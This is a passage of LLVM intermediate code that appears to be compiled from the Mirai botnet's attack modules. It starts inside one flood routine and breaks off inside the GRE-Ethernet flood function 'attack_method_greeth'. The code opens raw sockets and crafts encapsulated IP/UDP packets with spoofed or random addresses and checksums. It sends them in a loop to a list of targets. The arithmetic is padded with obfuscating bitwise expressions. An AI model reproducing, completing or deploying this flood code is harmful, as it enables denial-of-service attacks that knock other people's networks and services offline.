  %449 = load i16, i16* %17, align 2
  %450 = zext i16 %449 to i32
  %451 = icmp eq i32 %450, 65535
  br i1 %451, label %452, label %461

; <label>:452:                                    ; preds = %448
  %453 = call i32 @rand_next()
  %454 = xor i32 65535, -1
  %455 = xor i32 %453, %454
  %456 = and i32 %455, %453
  %457 = and i32 %453, 65535
  %458 = trunc i32 %456 to i16
  %459 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %460 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %459, i32 0, i32 1
  store i16 %458, i16* %460, align 2
  br label %461

; <label>:461:                                    ; preds = %452, %448
  %462 = load i8, i8* %20, align 1
  %463 = icmp ne i8 %462, 0
  br i1 %463, label %468, label %464

; <label>:464:                                    ; preds = %461
  %465 = call i32 @rand_next()
  %466 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %467 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %466, i32 0, i32 9
  store i32 %465, i32* %467, align 4
  br label %474

; <label>:468:                                    ; preds = %461
  %469 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %470 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %469, i32 0, i32 9
  %471 = load i32, i32* %470, align 4
  %472 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %473 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %472, i32 0, i32 9
  store i32 %471, i32* %473, align 4
  br label %474

; <label>:474:                                    ; preds = %468, %464
  %475 = load i8, i8* %19, align 1
  %476 = icmp ne i8 %475, 0
  br i1 %476, label %477, label %480

; <label>:477:                                    ; preds = %474
  %478 = load i8*, i8** %31, align 8
  %479 = load i32, i32* %18, align 4
  call void @rand_str(i8* %478, i32 %479)
  br label %480

; <label>:480:                                    ; preds = %477, %474
  %481 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %482 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %481, i32 0, i32 7
  store i16 0, i16* %482, align 2
  %483 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %484 = bitcast %struct.iphdr* %483 to i16*
  %485 = call zeroext i16 @checksum_generic(i16* %484, i32 20)
  %486 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %487 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %486, i32 0, i32 7
  store i16 %485, i16* %487, align 2
  %488 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %489 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %488, i32 0, i32 7
  store i16 0, i16* %489, align 2
  %490 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %491 = bitcast %struct.iphdr* %490 to i16*
  %492 = call zeroext i16 @checksum_generic(i16* %491, i32 20)
  %493 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %494 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %493, i32 0, i32 7
  store i16 %492, i16* %494, align 2
  %495 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %496 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %495, i32 0, i32 3
  store i16 0, i16* %496, align 2
  %497 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %498 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %499 = bitcast %struct.udphdr* %498 to i8*
  %500 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %501 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %500, i32 0, i32 2
  %502 = load i16, i16* %501, align 2
  %503 = load i32, i32* %18, align 4
  %504 = sext i32 %503 to i64
  %505 = add i64 8, -462393813757064910
  %506 = add i64 %505, %504
  %507 = sub i64 %506, -462393813757064910
  %508 = add i64 8, %504
  %509 = trunc i64 %507 to i32
  %510 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %497, i8* %499, i16 zeroext %502, i32 %509)
  %511 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %512 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %511, i32 0, i32 3
  store i16 %510, i16* %512, align 2
  %513 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %514 = load i32, i32* %9, align 4
  %515 = sext i32 %514 to i64
  %516 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %513, i64 %515
  %517 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %516, i32 0, i32 0
  %518 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %517, i32 0, i32 0
  store i16 2, i16* %518, align 4
  %519 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %520 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %519, i32 0, i32 9
  %521 = load i32, i32* %520, align 4
  %522 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %523 = load i32, i32* %9, align 4
  %524 = sext i32 %523 to i64
  %525 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %522, i64 %524
  %526 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %525, i32 0, i32 0
  %527 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %526, i32 0, i32 2
  %528 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %527, i32 0, i32 0
  store i32 %521, i32* %528, align 4
  %529 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %530 = load i32, i32* %9, align 4
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %529, i64 %531
  %533 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %532, i32 0, i32 0
  %534 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %533, i32 0, i32 1
  store i16 0, i16* %534, align 2
  %535 = load i32, i32* %10, align 4
  %536 = load i8*, i8** %26, align 8
  %537 = load i32, i32* %18, align 4
  %538 = sext i32 %537 to i64
  %539 = sub i64 0, 52
  %540 = sub i64 0, %538
  %541 = add i64 %539, %540
  %542 = sub i64 0, %541
  %543 = add i64 52, %538
  %544 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %545 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %546 = load i32, i32* %9, align 4
  %547 = sext i32 %546 to i64
  %548 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %545, i64 %547
  %549 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %548, i32 0, i32 0
  %550 = bitcast %struct.sockaddr_in* %549 to %struct.sockaddr*
  store %struct.sockaddr* %550, %struct.sockaddr** %544, align 8
  %551 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %552 = load %struct.sockaddr*, %struct.sockaddr** %551, align 8
  %553 = call i64 @sendto(i32 %535, i8* %536, i64 %542, i32 16384, %struct.sockaddr* %552, i32 16)
  br label %554

; <label>:554:                                    ; preds = %480
  %555 = load i32, i32* %9, align 4
  %556 = sub i32 0, 1
  %557 = sub i32 %555, %556
  %558 = add nsw i32 %555, 1
  store i32 %557, i32* %9, align 4
  br label %338

; <label>:559:                                    ; preds = %338
  br label %337

; <label>:560:                                    ; preds = %84, %78
  ret void
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greeth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.ethhdr*, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.grehdr*, align 8
  %33 = alloca %struct.ethhdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %41 = load i8, i8* %5, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %11, align 8
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %12, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %13, align 2
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %14, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %15, align 1
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %16, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %17, align 2
  %69 = load i8, i8* %7, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 0, i32 512)
  store i32 %71, i32* %18, align 4
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 1, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %19, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 19, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %20, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 25, i32 %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %4
  br label %590

; <label>:87:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 %93)
  br label %590

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %327, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %332

; <label>:101:                                    ; preds = %96
  %102 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %103 = load i8**, i8*** %11, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %22, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.grehdr*
  store %struct.grehdr* %115, %struct.grehdr** %23, align 8
  %116 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %117 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %116, i64 1
  %118 = bitcast %struct.grehdr* %117 to %struct.ethhdr*
  store %struct.ethhdr* %118, %struct.ethhdr** %24, align 8
  %119 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %120 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %119, i64 1
  %121 = bitcast %struct.ethhdr* %120 to %struct.iphdr*
  store %struct.iphdr* %121, %struct.iphdr** %25, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i64 1
  %124 = bitcast %struct.iphdr* %123 to %struct.udphdr*
  store %struct.udphdr* %124, %struct.udphdr** %26, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %126 = bitcast %struct.iphdr* %125 to i8*
  %127 = load i8, i8* %126, align 4
  %128 = xor i8 15, -1
  %129 = xor i8 %127, %128
  %130 = and i8 %129, %127
  %131 = and i8 %127, 15
  %132 = xor i8 %130, -1
  %133 = xor i8 64, -1
  %134 = xor i8 20, -1
  %135 = and i8 %132, 20
  %136 = and i8 %130, %134
  %137 = and i8 %133, 20
  %138 = and i8 64, %134
  %139 = or i8 %135, %136
  %140 = or i8 %137, %138
  %141 = xor i8 %139, %140
  %142 = or i8 %132, %133
  %143 = xor i8 %142, -1
  %144 = or i8 20, %134
  %145 = and i8 %143, %144
  %146 = or i8 %141, %145
  %147 = or i8 %130, 64
  store i8 %146, i8* %126, align 4
  %148 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %149 = bitcast %struct.iphdr* %148 to i8*
  %150 = load i8, i8* %149, align 4
  %151 = xor i8 -16, -1
  %152 = xor i8 %150, %151
  %153 = and i8 %152, %150
  %154 = and i8 %150, -16
  %155 = and i8 %153, 5
  %156 = xor i8 %153, 5
  %157 = or i8 %155, %156
  %158 = or i8 %153, 5
  store i8 %157, i8* %149, align 4
  %159 = load i8, i8* %12, align 1
  %160 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 1
  store i8 %159, i8* %161, align 1
  %162 = load i32, i32* %18, align 4
  %163 = sext i32 %162 to i64
  %164 = sub i64 0, %163
  %165 = sub i64 66, %164
  %166 = add i64 66, %163
  %167 = trunc i64 %165 to i16
  %168 = call zeroext i16 @htons(i16 zeroext %167) #7
  %169 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 2
  store i16 %168, i16* %170, align 2
  %171 = load i16, i16* %13, align 2
  %172 = call zeroext i16 @htons(i16 zeroext %171) #7
  %173 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 3
  store i16 %172, i16* %174, align 4
  %175 = load i8, i8* %14, align 1
  %176 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 5
  store i8 %175, i8* %177, align 4
  %178 = load i8, i8* %15, align 1
  %179 = icmp ne i8 %178, 0
  br i1 %179, label %180, label %184

; <label>:180:                                    ; preds = %101
  %181 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %182 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 4
  store i16 %181, i16* %183, align 2
  br label %184

; <label>:184:                                    ; preds = %180, %101
  %185 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 6
  store i8 47, i8* %186, align 1
  %187 = load i32, i32* %21, align 4
  %188 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 8
  store i32 %187, i32* %189, align 4
  %190 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %191 = load i32, i32* %9, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i64 %192
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i32 0, i32 1
  %195 = load i32, i32* %194, align 4
  %196 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 9
  store i32 %195, i32* %197, align 4
  %198 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %199 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %200 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %199, i32 0, i32 1
  store i16 %198, i16* %200, align 2
  %201 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %202 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %203 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %202, i32 0, i32 2
  store i16 %201, i16* %203, align 1
  %204 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %205 = bitcast %struct.iphdr* %204 to i8*
  %206 = load i8, i8* %205, align 4
  %207 = xor i8 15, -1
  %208 = xor i8 %206, %207
  %209 = and i8 %208, %206
  %210 = and i8 %206, 15
  %211 = and i8 %209, 64
  %212 = xor i8 %209, 64
  %213 = or i8 %211, %212
  %214 = or i8 %209, 64
  store i8 %213, i8* %205, align 4
  %215 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %216 = bitcast %struct.iphdr* %215 to i8*
  %217 = load i8, i8* %216, align 4
  %218 = xor i8 %217, -1
  %219 = xor i8 -16, -1
  %220 = xor i8 -56, -1
  %221 = or i8 %218, %219
  %222 = or i8 -56, %220
  %223 = xor i8 %221, -1
  %224 = and i8 %223, %222
  %225 = and i8 %217, -16
  %226 = xor i8 %224, -1
  %227 = xor i8 5, -1
  %228 = xor i8 3, -1
  %229 = and i8 %226, 3
  %230 = and i8 %224, %228
  %231 = and i8 %227, 3
  %232 = and i8 5, %228
  %233 = or i8 %229, %230
  %234 = or i8 %231, %232
  %235 = xor i8 %233, %234
  %236 = or i8 %226, %227
  %237 = xor i8 %236, -1
  %238 = or i8 3, %228
  %239 = and i8 %237, %238
  %240 = or i8 %235, %239
  %241 = or i8 %224, 5
  store i8 %240, i8* %216, align 4
  %242 = load i8, i8* %12, align 1
  %243 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %244 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %243, i32 0, i32 1
  store i8 %242, i8* %244, align 1
  %245 = load i32, i32* %18, align 4
  %246 = sext i32 %245 to i64
  %247 = sub i64 0, %246
  %248 = sub i64 28, %247
  %249 = add i64 28, %246
  %250 = trunc i64 %248 to i16
  %251 = call zeroext i16 @htons(i16 zeroext %250) #7
  %252 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 2
  store i16 %251, i16* %253, align 2
  %254 = load i16, i16* %13, align 2
  %255 = zext i16 %254 to i32
  %256 = xor i32 %255, -1
  %257 = and i32 -1, %256
  %258 = xor i32 -1, -1
  %259 = and i32 %255, %258
  %260 = or i32 %257, %259
  %261 = xor i32 %255, -1
  %262 = trunc i32 %260 to i16
  %263 = call zeroext i16 @htons(i16 zeroext %262) #7
  %264 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i32 0, i32 3
  store i16 %263, i16* %265, align 4
  %266 = load i8, i8* %14, align 1
  %267 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 5
  store i8 %266, i8* %268, align 4
  %269 = load i8, i8* %15, align 1
  %270 = icmp ne i8 %269, 0
  br i1 %270, label %271, label %275

; <label>:271:                                    ; preds = %184
  %272 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %273 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %274 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %273, i32 0, i32 4
  store i16 %272, i16* %274, align 2
  br label %275

; <label>:275:                                    ; preds = %271, %184
  %276 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 6
  store i8 17, i8* %277, align 1
  %278 = call i32 @rand_next()
  %279 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 8
  store i32 %278, i32* %280, align 4
  %281 = load i8, i8* %20, align 1
  %282 = icmp ne i8 %281, 0
  br i1 %282, label %283, label %289

; <label>:283:                                    ; preds = %275
  %284 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %285 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %284, i32 0, i32 9
  %286 = load i32, i32* %285, align 4
  %287 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %288 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %287, i32 0, i32 9
  store i32 %286, i32* %288, align 4
  br label %309

; <label>:289:                                    ; preds = %275
  %290 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 8
  %292 = load i32, i32* %291, align 4
  %293 = sub i32 0, 1024
  %294 = add i32 %292, %293
  %295 = sub i32 %292, 1024
  %296 = xor i32 %294, -1
  %297 = and i32 -332295419, %296
  %298 = xor i32 -332295419, -1
  %299 = and i32 %294, %298
  %300 = xor i32 -1, -1
  %301 = and i32 %300, -332295419
  %302 = and i32 -1, %298
  %303 = or i32 %297, %299
  %304 = or i32 %301, %302
  %305 = xor i32 %303, %304
  %306 = xor i32 %294, -1
  %307 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %308 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %307, i32 0, i32 9
  store i32 %305, i32* %308, align 4
  br label %309

; <label>:309:                                    ; preds = %289, %283
  %310 = load i16, i16* %16, align 2
  %311 = call zeroext i16 @htons(i16 zeroext %310) #7
  %312 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %313 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %312, i32 0, i32 0
  store i16 %311, i16* %313, align 2
  %314 = load i16, i16* %17, align 2
  %315 = call zeroext i16 @htons(i16 zeroext %314) #7
  %316 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %317 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %316, i32 0, i32 1
  store i16 %315, i16* %317, align 2
  %318 = load i32, i32* %18, align 4
  %319 = sext i32 %318 to i64
  %320 = sub i64 0, %319
  %321 = sub i64 8, %320
  %322 = add i64 8, %319
  %323 = trunc i64 %321 to i16
  %324 = call zeroext i16 @htons(i16 zeroext %323) #7
  %325 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %326 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %325, i32 0, i32 2
  store i16 %324, i16* %326, align 2
  br label %327

; <label>:327:                                    ; preds = %309
  %328 = load i32, i32* %9, align 4
  %329 = sub i32 0, 1
  %330 = sub i32 %328, %329
  %331 = add nsw i32 %328, 1
  store i32 %330, i32* %9, align 4
  br label %96

; <label>:332:                                    ; preds = %96
  br label %333

; <label>:333:                                    ; preds = %589, %332
  store i32 0, i32* %9, align 4
  br label %334

; <label>:334:                                    ; preds = %584, %333
  %335 = load i32, i32* %9, align 4
  %336 = load i8, i8* %5, align 1
  %337 = zext i8 %336 to i32
  %338 = icmp slt i32 %335, %337
  br i1 %338, label %339, label %589

; <label>:339:                                    ; preds = %334
  %340 = load i8**, i8*** %11, align 8
  %341 = load i32, i32* %9, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds i8*, i8** %340, i64 %342
  %344 = load i8*, i8** %343, align 8
  store i8* %344, i8** %30, align 8
  %345 = load i8*, i8** %30, align 8
  %346 = bitcast i8* %345 to %struct.iphdr*
  store %struct.iphdr* %346, %struct.iphdr** %31, align 8
  %347 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i64 1
  %349 = bitcast %struct.iphdr* %348 to %struct.grehdr*
  store %struct.grehdr* %349, %struct.grehdr** %32, align 8
  %350 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %351 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %350, i64 1
  %352 = bitcast %struct.grehdr* %351 to %struct.ethhdr*
  store %struct.ethhdr* %352, %struct.ethhdr** %33, align 8
  %353 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %354 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %353, i64 1
  %355 = bitcast %struct.ethhdr* %354 to %struct.iphdr*
  store %struct.iphdr* %355, %struct.iphdr** %34, align 8
  %356 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %357 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %356, i64 1
  %358 = bitcast %struct.iphdr* %357 to %struct.udphdr*
  store %struct.udphdr* %358, %struct.udphdr** %35, align 8
  %359 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %360 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %359, i64 1
  %361 = bitcast %struct.udphdr* %360 to i8*
  store i8* %361, i8** %36, align 8
  %362 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %363 = load i32, i32* %9, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %362, i64 %364
  %366 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %365, i32 0, i32 2
  %367 = load i8, i8* %366, align 4
  %368 = zext i8 %367 to i32
  %369 = icmp slt i32 %368, 32
  br i1 %369, label %370, label %395

; <label>:370:                                    ; preds = %339
  %371 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %372 = load i32, i32* %9, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i64 %373
  %375 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %374, i32 0, i32 1
  %376 = load i32, i32* %375, align 4
  %377 = call i32 @ntohl(i32 %376) #7
  %378 = call i32 @rand_next()
  %379 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %380 = load i32, i32* %9, align 4
  %381 = sext i32 %380 to i64
  %382 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %379, i64 %381
  %383 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %382, i32 0, i32 2
  %384 = load i8, i8* %383, align 4
  %385 = zext i8 %384 to i32
  %386 = lshr i32 %378, %385
  %387 = sub i32 0, %377
  %388 = sub i32 0, %386
  %389 = add i32 %387, %388
  %390 = sub i32 0, %389
  %391 = add i32 %377, %386
  %392 = call i32 @htonl(i32 %390) #7
  %393 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %394 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %393, i32 0, i32 9
  store i32 %392, i32* %394, align 4
  br label %395

; <label>:395:                                    ; preds = %370, %339
  %396 = load i32, i32* %21, align 4
  %397 = icmp eq i32 %396, -1
  br i1 %397, label %398, label %402

; <label>:398:                                    ; preds = %395
  %399 = call i32 @rand_next()
  %400 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %401 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %400, i32 0, i32 8
  store i32 %399, i32* %401, align 4
  br label %402

; <label>:402:                                    ; preds = %398, %395
  %403 = load i16, i16* %13, align 2
